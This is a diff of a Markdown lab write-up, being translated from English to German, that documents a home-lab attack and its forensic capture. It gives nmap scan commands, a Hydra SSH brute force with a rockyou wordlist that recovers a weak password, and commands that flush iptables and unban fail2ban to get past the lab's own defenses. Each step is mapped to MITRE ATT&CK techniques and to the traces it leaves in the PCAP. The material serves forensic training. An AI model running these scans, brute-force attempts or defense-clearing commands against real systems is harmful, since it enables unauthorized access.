@@ -1,135 +1,107 @@
 # 03 — Attack Scenario
 
-## Overview
+## Übersicht
 
-Four attacks were executed from Kali (192.168.178.129) against aegis-sentinel (192.168.178.126) while `tcpdump` captured all traffic. The attack sequence mirrors Ch.01/02 but with an additional nmap flag for richer forensic evidence.
-
----
-
-## Attack Sequence
-
-### Step 1 — tcpdump Start (aegis-sentinel)
-
-```bash
-sudo tcpdump -i enp0s3 -w /tmp/ch03_full.pcap
-```
-
-Started **before** all attacks. Captures every packet on the network.
+Vier Angriffe wurden von Kali (192.168.178.129) gegen aegis-sentinel (192.168.178.126) ausgeführt, während `tcpdump` alles aufnahm.
 
 ---
 
-### Step 2 — nmap SYN Scan (Kali)
+## Angriff 1 — nmap SYN Scan
 
 ```bash
 sudo nmap -sS -A -T4 192.168.178.126
 ```
 
-| Flag | Meaning |
-|:-----|:--------|
-| `-sS` | SYN scan — half-open, never completes TCP handshake |
-| `-A` | Aggressive — OS detection, version detection, traceroute |
-| `-T4` | Timing template 4 — fast scan |
+| Flag | Bedeutung |
+|:-----|:----------|
+| `-sS` | SYN Scan — schickt nur SYN, wartet auf Antwort, sendet kein ACK |
+| `-A` | Aggressiv — OS, Version, Traceroute |
+| `-T4` | Schnell |
 
-**Result:**
+**Ergebnis:**
+
+![nmap SYN Scan](1.png)
+
 ```
 PORT   STATE  SERVICE  VERSION
-22/tcp open   ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
-OS:    Linux 4.15-5.19
-Network Distance: 1 hop
+22/tcp open   ssh      OpenSSH 9.6p1 Ubuntu
+OS: Linux 4.15-5.19
 ```
 
-**MITRE ATT&CK:** T1595 — Active Scanning
+**MITRE:** T1595 — Active Scanning
 
 ---
 
-### Step 3 — nmap OS Fingerprinting (Kali)
+## Angriff 2 — nmap OS Fingerprinting
 
 ```bash
 sudo nmap -O 192.168.178.126
 ```
 
-| Flag | Meaning |
-|:-----|:--------|
-| `-O` | OS detection — sends unusual TCP probes to fingerprint OS |
+**Ergebnis:**
 
-**Result:**
-```
-PORT   STATE  SERVICE
-22/tcp open   ssh
-Device type: general purpose
-Running: Linux 4.X|5.X
-OS details: Linux 4.15 – 5.19
-```
+![nmap OS Fingerprinting](4.png)
 
-**Key forensic artifact:** Sends `[FIN, SYN, PSH, URG]` combined flags — impossible in normal traffic, unique nmap fingerprint visible in PCAP.
+**Besonderheit:** nmap schickt absichtlich unmögliche Flag-Kombinationen (`FIN+SYN+PSH+URG`) — im PCAP sofort erkennbar.
 
-**MITRE ATT&CK:** T1595 — Active Scanning
+**MITRE:** T1595 — Active Scanning
 
 ---
 
-### Step 4 — nmap Service Version Detection (Kali)
+## Angriff 3 — nmap Service Version Detection
 
 ```bash
 sudo nmap -sV 192.168.178.126
 ```
 
-| Flag | Meaning |
-|:-----|:--------|
-| `-sV` | Service version detection — connects to open ports and reads banners |
+**Ergebnis:**
 
-**Result:**
+![nmap Service Detection](5.png)
+
 ```
-PORT   STATE  SERVICE  VERSION
-22/tcp open   ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
+22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
 ```
 
-**Key forensic artifact:** nmap identifies itself in SSH banner exchange:
-```
-Client: Protocol (SSH-2.0-NmapNSE-1.0)
-Client: Protocol (SSH-2.0-Nmap-SSH2-Hostkey)
-```
+**Besonderheit:** nmap liest den SSH Banner und identifiziert sich dabei selbst als `SSH-2.0-NmapNSE` — im PCAP sichtbar.
 
-**MITRE ATT&CK:** T1595 — Active Scanning
+**MITRE:** T1595 — Active Scanning
 
 ---
 
-### Step 5 — Hydra SSH Brute Force (Kali)
+## Angriff 4 — Hydra SSH Brute Force
 
 ```bash
 hydra -l aegis-siem -P /tmp/rockyou_9800.txt ssh://192.168.178.126
 ```
 
-| Flag | Meaning |
-|:-----|:--------|
-| `-l aegis-siem` | Single username to target |
-| `-P /tmp/rockyou_9800.txt` | Password list starting at line 9800 |
-| `ssh://` | Protocol — SSH on default port 22 |
+**Ergebnis:**
 
-**Result:**
+![Hydra Brute Force](3.png)
+
 ```
-[22][ssh] host: 192.168.178.126   login: aegis-siem   password: 1111
-1 of 1 target successfully completed, 1 valid password found
+[22][ssh] host: 192.168.178.126   login: aegis-siem   password: 1111 ✅
 ```
 
-**MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing → T1078 — Valid Accounts
+**Hinweis:** fail2ban aus Ch.02 war noch aktiv — hat Kali nach 5 Versuchen geblockt. Deshalb mussten wir zuerst die Blockierung aufheben:
 
----
+```bash
+sudo iptables -F
+sudo fail2ban-client unban --all
+```
 
-### Step 6 — tcpdump Stop (aegis-sentinel)
-
-`Ctrl+C` to stop capture. PCAP saved to `/tmp/ch03_full.pcap`.
+**MITRE:** T1110.001 → T1078
 
 ---
 
 ## MITRE ATT&CK Kill Chain
 
-| Phase | Technique | ID | Tool | Evidence in PCAP |
-|:------|:----------|:---|:-----|:-----------------|
-| Reconnaissance | Active Scanning | T1595 | nmap -sS | SYN flood, Win=1024 fingerprint |
-| Reconnaissance | Active Scanning | T1595 | nmap -O | FIN+SYN+PSH+URG combined flags |
-| Reconnaissance | Active Scanning | T1595 | nmap -sV | SSH-2.0-NmapNSE banner in cleartext |
-| Credential Access | Brute Force: Password Guessing | T1110.001 | Hydra | Repeated Key Exchange Init pattern |
-| Initial Access | Valid Accounts | T1078 | Hydra | Large encrypted session packets |
+| Phase | Technik | ID | Tool |
+|:------|:--------|:---|:-----|
+| Reconnaissance | Active Scanning | T1595 | nmap -sS |
+| Reconnaissance | Active Scanning | T1595 | nmap -O |
+| Reconnaissance | Active Scanning | T1595 | nmap -sV |
+| Credential Access | Brute Force | T1110.001 | Hydra |
+| Initial Access | Valid Accounts | T1078 | Hydra |
 
 ---
 
